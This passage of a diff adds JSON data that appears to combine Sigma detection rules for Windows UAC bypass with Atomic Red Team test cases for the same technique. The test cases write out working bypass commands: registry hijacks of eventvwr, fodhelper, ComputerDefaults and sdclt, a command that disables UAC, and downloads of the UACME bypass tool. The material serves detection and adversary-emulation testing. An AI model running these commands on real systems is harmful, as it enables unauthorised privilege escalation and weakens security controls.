+                        "uuid": "49f2f17b-b4c8-4172-a68b-d5bf95d05130",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/13\ndescription: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\ndetection:\n  condition: selection and not filter\n  filter:\n  - Image|endswith: \\WerFault.exe\n  - OriginalFileName: WerFault.exe\n  selection:\n    ParentCommandLine|contains:\n    - /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\n    - /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\n    ParentImage|endswith: \\dllhost.exe\nfalsepositives:\n- Unknown\nid: 49f2f17b-b4c8-4172-a68b-d5bf95d05130\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/27\nreferences:\n- https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass via ICMLuaUtil\n",
+                            "sigma:id": "49f2f17b-b4c8-4172-a68b-d5bf95d05130",
+                            "title": "UAC Bypass via ICMLuaUtil",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "853e74f9-9392-4935-ad3b-2e8c040dae86",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe\n  63)\ndetection:\n  condition: selection\n  selection:\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\Temp\\\n    - \\DismHost.exe\nfalsepositives:\n- Unknown\nid: 853e74f9-9392-4935-ad3b-2e8c040dae86\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using DismHost\n",
+                            "sigma:id": "853e74f9-9392-4935-ad3b-2e8c040dae86",
+                            "title": "UAC Bypass Using DismHost",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4b60e6f2-bf39-47b4-b4ea-398e33cfe253",
+                        "lookup_data": {
+                            "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)",
+                            "raw": "author: Nik Seetharaman, Christian Burkard (Nextron Systems)\ndate: 2019/07/31\ndescription: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile\n  Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)\ndetection:\n  condition: selection\n  selection:\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine|contains:\n    - ' /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n    - ' /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}'\n    - ' /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}'\n    - ' /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    - ' /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}'\n    ParentImage|endswith: \\DllHost.exe\nfalsepositives:\n- Legitimate CMSTP use (unlikely in modern enterprise environments)\nfields:\n- CommandLine\n- ParentCommandLine\n- Hashes\nid: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\n- https://twitter.com/hFireF0X/status/897640081053364225\n- https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\n- https://github.com/hfiref0x/UACME\nstatus: stable\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- attack.t1218.003\n- attack.g0069\n- car.2019-04-001\ntitle: CMSTP UAC Bypass via COM Object Access\n",
+                            "sigma:id": "4b60e6f2-bf39-47b4-b4ea-398e33cfe253",
+                            "title": "CMSTP UAC Bypass via COM Object Access",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bdd8157d-8e85-4397-bb82-f06cc9c71dbb",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\ndetection:\n  condition: selection\n  selection:\n    Image: C:\\Program Files\\Internet Explorer\\IEInstal.exe\n    TargetFilename|contains: \\AppData\\Local\\Temp\\\n    TargetFilename|endswith: consent.exe\n    TargetFilename|startswith: C:\\Users\\\nfalsepositives:\n- Unknown\nid: bdd8157d-8e85-4397-bb82-f06cc9c71dbb\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using IEInstal - File\n",
+                            "sigma:id": "bdd8157d-8e85-4397-bb82-f06cc9c71dbb",
+                            "title": "UAC Bypass Using IEInstal - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "93a19907-d4f9-4deb-9f91-aac4692776a6",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe\n  DLL hijacking (UACMe 39)\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\AppData\\Local\\Temp\\pe386.dll\n    TargetFilename|startswith: C:\\Users\\\nfalsepositives:\n- Unknown\nid: 93a19907-d4f9-4deb-9f91-aac4692776a6\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using .NET Code Profiler on MMC\n",
+                            "sigma:id": "93a19907-d4f9-4deb-9f91-aac4692776a6",
+                            "title": "UAC Bypass Using .NET Code Profiler on MMC",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1548.002",
+                "display_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+                "atomic_tests": [
+                    {
+                        "name": "Bypass UAC using Event Viewer (cmd)",
+                        "auto_generated_guid": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
+                        "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n",
+                            "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using Event Viewer (PowerShell)",
+                        "auto_generated_guid": "a6ce9acf-842a-4af6-8f79-539be7608e2b",
+                        "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
+                            "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using Fodhelper",
+                        "auto_generated_guid": "58f641ea-12e3-499a-b684-44dee46bd182",
+                        "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
+                            "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using Fodhelper - PowerShell",
+                        "auto_generated_guid": "3f627297-6c38-4e7d-a278-fc2563eaaeaa",
+                        "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
+                            "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using ComputerDefaults (PowerShell)",
+                        "auto_generated_guid": "3c51abf2-44bf-42d8-9111-dc96ff66750f",
+                        "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
+                            "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC by Mocking Trusted Directories",
+                        "auto_generated_guid": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
+                        "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "executable_binary": {
+                                "description": "Binary to execute with UAC Bypass",
+                                "type": "path",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
+                            "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using sdclt DelegateExecute",
+                        "auto_generated_guid": "3be891eb-4608-4173-87e8-78b494c029b7",
+                        "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "command_to_execute": {
+                                "description": "Command to execute",
+                                "type": "string",
+                                "default": "cmd.exe /c notepad.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n",
+                            "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Disable UAC using reg.exe",
+                        "auto_generated_guid": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9",
+                        "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
+                            "cleanup_command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Bypass UAC using SilentCleanup task",
+                        "auto_generated_guid": "28104f8a-4ff1-4582-bcf6-699dce156608",
+                        "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to the bat file",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat"
+                            }
+                        },
+                        "executor": {
+                            "command": "\"#{file_path}\"\n",
+                            "name": "command_prompt",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 23",
+                        "auto_generated_guid": "8ceab7a2-563a-47d2-b5ba-0995211128d7",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 31",
+                        "auto_generated_guid": "b0f76240-9f33-4d34-90e8-3a7d501beb15",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 33",
+                        "auto_generated_guid": "e514bb03-f71c-4b22-9092-9f961ec6fb03",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 34",
+                        "auto_generated_guid": "695b2dac-423e-448e-b6ef-5b88e93011d6",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 39",
+                        "auto_generated_guid": "56163687-081f-47da-bb9c-7b231c5585cf",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 56",
+                        "auto_generated_guid": "235ec031-cd2d-465d-a7ae-68bab281e80e",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 59",
+                        "auto_generated_guid": "dfb1b667-4bb8-4a63-a85e-29936ea75f29",
